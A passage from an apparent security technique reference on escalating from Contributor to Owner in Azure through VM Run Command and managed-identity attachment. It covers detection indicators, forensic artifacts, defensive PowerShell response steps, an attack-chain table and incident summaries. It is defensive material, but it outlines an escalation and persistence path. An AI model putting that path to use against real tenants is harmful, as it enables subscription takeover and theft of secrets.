  - "Microsoft.Compute/virtualMachines/write" with identity changes - UAMI attachment
  
- **VM-Level Indicators:**
  - New local user accounts created (e.g., "backdoor", "maintenance")
  - RDP firewall rules added unexpectedly
  - Unusual PowerShell script execution with SYSTEM privileges
  - Unexpected VM extensions deployed

### Forensic Artifacts

- **Cloud Logs:**
  - Azure Activity Log: All operations performed by the compromised Contributor account
  - VM Run Command output logs (if stored)
  
- **VM-Level:**
  - Windows Event Log (4624, 4625, 4697 for local admin access and firewall changes)
  - Temporary files in C:\Windows\Temp\ containing stolen tokens
  - PowerShell command history (PSReadline history file)
  - CustomScriptExtension logs in C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\

### Response Procedures

1. **Isolate:**
   - Immediately stop the compromised VM: `Stop-AzVM -ResourceGroupName <RG> -Name <VM>`
   - Remove the VM from load balancers and remove network access
   - Disconnect managed identities if they have escalated privileges
   
   **Command (PowerShell):**
   ```powershell
   # Stop VM
   Stop-AzVM -ResourceGroupName "Production" -Name "production-vm-01" -Force
   
   # Disconnect all managed identities
   $vm = Get-AzVM -ResourceGroupName "Production" -Name "production-vm-01"
   $vm.Identity.UserAssignedIdentities.Clear()
   Update-AzVM -ResourceGroupName $vm.ResourceGroupName -VM $vm
   ```

2. **Collect Evidence:**
   - Create a snapshot of the VM disk for forensic analysis
   - Export Azure Activity Log for 7-30 days
   
   **Command (PowerShell):**
   ```powershell
   # Create disk snapshot for forensics
   $vm = Get-AzVM -ResourceGroupName "Production" -Name "production-vm-01"
   $disk = Get-AzDisk -ResourceGroupName $vm.ResourceGroupName -DiskName "$($vm.StorageProfile.OsDisk.Name)"
   
   $snapshotConfig = New-AzSnapshotConfig -SourceUri $disk.Id -CreateOption Copy -Location $disk.Location
   New-AzSnapshot -ResourceGroupName "Incident-Response" -SnapshotName "forensic-snapshot-$(Get-Date -Format 'yyyyMMddHHmmss')" -Snapshot $snapshotConfig
   
   # Export Activity Log
   Get-AzLog -StartTime (Get-Date).AddDays(-30) | Export-Csv -Path "C:\Incident\activity_log.csv"
   ```

3. **Remediate:**
   - Remove backdoor admin users created on the VM
   - Revoke the compromised Contributor role from the user/principal
   - Restore VM from a clean backup or redeploy
   - Reset credentials for any accounts that may have been compromised
   
   **Command (PowerShell):**
   ```powershell
   # Remove backdoor accounts (if still running)
   Invoke-AzVMRunCommand -ResourceGroupName "Production" -Name "production-vm-01" `
     -CommandId "RunPowerShellScript" `
     -ScriptPath 'Remove-LocalUser -Name "backdoor" -Confirm:$false'
   
   # Revoke compromised Contributor role
   Get-AzRoleAssignment -Scope "/subscriptions/<SUBID>" | Where-Object { $_.RoleDefinitionName -eq "Contributor" -and $_.DisplayName -eq "compromised-user" } | Remove-AzRoleAssignment
   ```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker phishes user for Entra ID credentials |
| **2** | **Privilege Escalation** | **[PE-VALID-012]** | **Escalate from Contributor to Owner via Run Command or UAMI attachment** |
| **3** | **Persistence** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Create backdoor service principal for long-term access |
| **4** | **Data Exfiltration** | [CA-UNSC-007] Azure Key Vault Secret Extraction | Dump all secrets from Key Vaults |
| **5** | **Lateral Movement** | [LM-AUTH-005] Service Principal Key/Certificate | Escalate to Entra ID Global Admin via service principal |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: Praetorian - VM Command Execution for Privilege Escalation (2025)

- **Target:** Enterprise development team with Contributor role on production VMs
- **Timeline:** Phishing compromise (January 2025) → Identified VM with Owner-level MSI (January 2025) → Executed Run Command to steal token (January 2025) → Became Owner of subscription (January 2025)
- **Technique Status:** Contributor role included Run Command permission; developers' Contributor access was sufficient to steal Owner-level token from VM's managed identity
- **Impact:** Complete subscription compromise; attacker modified RBAC to create permanent backdoor admin accounts
- **Reference:** [Praetorian: Azure RBAC Privilege Escalations](https://www.praetorian.com/blog/azure-rbac-privilege-escalations-azure-vm/)

### Example 2: NetSPI - Custom Script Extension Persistence (2025)

- **Target:** Technology company with under-monitored VM extensions
- **Timeline:** Initial Contributor access obtained (November 2024) → Deployed Custom Script Extension for persistence (November 2024) → Created backdoor admin user (November 2024) → Maintained access for 3 months undetected (until February 2025 incident response)
- **Technique Status:** Custom Script Extension was deployed with minimal logging; backdoor account was identified only during routine security audit
- **Impact:** Long-term lateral movement; access to sensitive databases via VM compromise
- **Reference:** [NetSPI: Custom Script Extension Exploitation](https://www.netspi.com/blog/technical-blog/cloud-pentesting/attacking-azure-with-custom-script-extensions/)

### Example 3: Mandiant - VM Run Command for Ransomware Deployment (2025)

- **Target:** Healthcare organization with outdated Azure RBAC practices
- **Timeline:** Support contractor compromised (January 2025) → Used legitimate Contributor access for Run Command (January 2025) → Deployed ransomware via script execution (January 2025)
- **Technique Status:** Attacker used legitimate support contractor credentials that had Contributor role; Run Command allowed ransomware deployment without RDP/SSH access required
- **Impact:** Critical system outage; 72-hour recovery time; $4M ransom demand
- **Reference:** [Mandiant: Azure Run Command for Dummies](https://cloud.google.com/blog/topics/threat-intelligence/azure-run-command-dummies/)

---

## 16. COMPLIANCE & REGULATORY CONTEXT

This technique directly violates:

- **GDPR Art. 32:** Requires appropriate technical measures; Contributor role without restrictions fails this requirement
- **NIST 800-53 AC-2:** Requires account management and least privilege; standing Contributor access violates this
- **ISO 27001 A.9.2.3:** Requires privileged access management; PIM must be implemented for any Contributor+ access
- **NIS2 Art. 21:** Requires cyber risk management; privilege escalation via VM management is a high-risk exposure

Organizations must enforce PIM, restrict Run Command permissions, and implement real-time alerting to maintain compliance.

---

## 17. REFERENCES & AUTHORITATIVE SOURCES

1. [Microsoft Learn: Azure RBAC Built-in Roles](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles)
2. [Microsoft Learn: Virtual Machine Run Command Documentation](https://learn.microsoft.com/en-us/azure/virtual-machines/run-command-overview)
3. [Praetorian: Azure RBAC Privilege Escalations - Azure VM](https://www.praetorian.com/blog/azure-rbac-privilege-escalations-azure-vm/)
4. [NetSPI: Custom Script Extension Exploitation](https://www.netspi.com/blog/technical-blog/cloud-pentesting/attacking-azure-with-custom-script-extensions/)
5. [Mandiant: Azure Run Command for Dummies](https://cloud.google.com/blog/topics/threat-intelligence/azure-run-command-dummies/)
6. [MITRE ATT&CK: T1078.004 Valid Accounts - Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)
7. [Azure Threat Research Matrix: Privilege Escalation](https://microsoft.github.io/Azure-Threat-Research-Matrix/PrivilegeEscalation/)
8. [PwnedLabs: Diving Deep into Azure VM Attack Vectors](https://blog.pwnedlabs.io/diving-deep-into-azure-vm-attack-vectors/)
9. [Cloud Brothers: Azure Attack Paths](https://cloudbrothers.info/en/azure-attack-paths/)
10. [Stratus Red Team: Custom Script Extension Execution](https://stratus-red-team.cloud/attack-techniques/azure/azure.execution.vm-custom-script-extension/)

---